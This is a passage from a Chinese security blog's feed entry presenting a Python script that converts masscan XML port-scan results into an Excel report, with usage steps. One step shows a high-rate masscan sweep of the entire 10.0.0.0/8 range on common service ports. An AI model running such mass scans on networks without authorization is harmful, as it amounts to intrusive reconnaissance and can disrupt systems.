class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> xml.dom.minidom</span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"><span class="keyword">from</span> xlsxwriter <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">author: c0ny1</span></span><br><span class="line"><span class="string">date: 2018-09-28 18:23</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_masscan_report</span><span class="params">(xml_path,xls_path)</span>:</span></span><br><span class="line">workbook = xlsxwriter.Workbook(xls_path)</span><br><span class="line">worksheet = workbook.add_worksheet(<span class="string">'Scan info'</span>)</span><br><span class="line">worksheet.autofilter(<span class="string">"A1:H1"</span>)  <span class="comment">#设置过滤</span></span><br><span class="line">worksheet.freeze_panes(<span class="number">1</span>, <span class="number">0</span>)  <span class="comment">#冻结窗格</span></span><br><span class="line"></span><br><span class="line">worksheet.lastrow = <span class="number">0</span></span><br><span class="line">summary_header = [<span class="string">"addr"</span>, <span class="string">"port"</span>, <span class="string">"state"</span>, <span class="string">"protocol"</span>, <span class="string">"addrtype"</span>, <span class="string">"reason"</span>, <span class="string">"reason_ttl"</span>, <span class="string">"scan_endtime"</span>]</span><br><span class="line"><span class="keyword">for</span> idx, item <span class="keyword">in</span> enumerate(summary_header):</span><br><span class="line">worksheet.write(<span class="number">0</span>, idx, item,workbook.add_format(&#123;<span class="string">"bold"</span>: <span class="literal">True</span>&#125;))</span><br><span class="line">worksheet.lastrow += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">DOMTree = xml.dom.minidom.parse(xml_path) </span><br><span class="line">data = DOMTree.documentElement</span><br><span class="line">nodelist = data.getElementsByTagName(<span class="string">'host'</span>)</span><br><span class="line">host_info = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> nodelist:</span><br><span class="line">scan_endtime = node.getAttribute(<span class="string">'endtime'</span>)</span><br><span class="line">scan_endtime = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>,time.localtime(int(scan_endtime)))</span><br><span class="line">address_node = node.getElementsByTagName(<span class="string">'address'</span>)</span><br><span class="line">addrtype = address_node[<span class="number">0</span>].getAttribute(<span class="string">'addrtype'</span>)</span><br><span class="line">addr = address_node[<span class="number">0</span>].getAttribute(<span class="string">'addr'</span>)</span><br><span class="line">port_node = node.getElementsByTagName(<span class="string">'port'</span>)</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> port_node:</span><br><span class="line">protocol = port.getAttribute(<span class="string">'protocol'</span>)</span><br><span class="line">portid = port.getAttribute(<span class="string">'portid'</span>)</span><br><span class="line">state_element = port.getElementsByTagName(<span class="string">'state'</span>)</span><br><span class="line">state = state_element[<span class="number">0</span>].getAttribute(<span class="string">'state'</span>)</span><br><span class="line">reason = state_element[<span class="number">0</span>].getAttribute(<span class="string">'reason'</span>)</span><br><span class="line">reason_ttl = state_element[<span class="number">0</span>].getAttribute(<span class="string">'reason_ttl'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] | %s | %s | %s | %s | %s | %s | %s | %s |'</span> % (addr,portid,state,protocol,addrtype,reason,reason_ttl,scan_endtime)</span><br><span class="line">scan_info = [addr,portid,state,protocol,addrtype,reason,reason_ttl,scan_endtime]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(scan_info)):</span><br><span class="line">worksheet.write(worksheet.lastrow, i, scan_info[i])</span><br><span class="line">worksheet.lastrow += <span class="number">1</span></span><br><span class="line">workbook.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--input"</span>, metavar=<span class="string">"XML"</span>, help=<span class="string">"path to xml input"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"-o"</span>, <span class="string">"--output"</span>, metavar=<span class="string">"XLS"</span>, help=<span class="string">"path to xlsx output"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">sys.argv.append(<span class="string">'-h'</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.input:</span><br><span class="line">xml_path = args.input</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">exit(<span class="string">'[*] please use -i set xml path!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.lexists(xml_path) == <span class="literal">False</span>:</span><br><span class="line">exit(<span class="string">'[*] %s does not exist!'</span>,xml_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.output:</span><br><span class="line">xls_path = args.output</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">xls_path = <span class="string">'./masscan_report.xls'</span></span><br><span class="line"></span><br><span class="line">convert_masscan_report(xml_path,xls_path)</span><br></pre></td></tr></table></figure><p>目前脚本已经收集到我的WorkScript项目中，地址如下：</p><p><a href="https://github.com/c0ny1/WorkScripts/tree/master/masscan-report-converter" target="_blank" rel="noopener">https://github.com/c0ny1/WorkScripts/tree/master/masscan-report-converter</a></p><h2 id="二、使用步骤"><a href="#二、使用步骤" class="headerlink" title="二、使用步骤"></a>二、使用步骤</h2><h5 id="1-使用masscan进行扫描，扫描结果以xml保存"><a href="#1-使用masscan进行扫描，扫描结果以xml保存" class="headerlink" title="1.使用masscan进行扫描，扫描结果以xml保存"></a>1.使用masscan进行扫描，扫描结果以xml保存</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan.exe -p21,22,23,80,7001,5900 10.0.0.0/8 --rate=100000 -oX scan_result.xml</span><br></pre></td></tr></table></figure><h5 id="2-使用上面写的脚本转换出xls格式的报告"><a href="#2-使用上面写的脚本转换出xls格式的报告" class="headerlink" title="2.使用上面写的脚本转换出xls格式的报告"></a>2.使用上面写的脚本转换出xls格式的报告</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan-report-converter.py -i scan_result.xml -o scan_result.xls</span><br></pre></td></tr></table></figure><p>最终效果如下：</p><p><img src="/articles/2018/masscan-report-converter/convert_result.png" alt="图1-脚本转换后的报告"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;由于nmap扫描比较慢，有时候需要使用masscan对大段ip进行快速扫描。为了后续方便数据处理，往往需要将数据以xls的形式进行统计，但是masscan只支持xml,json,list等格式输出,并不支持直接输出xls格式。最近有正好这个需求，于是写了个小脚本来转换一下。
      
    
    </summary>
    
      <category term="编程开发" scheme="http://gv7.me/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
</feed>
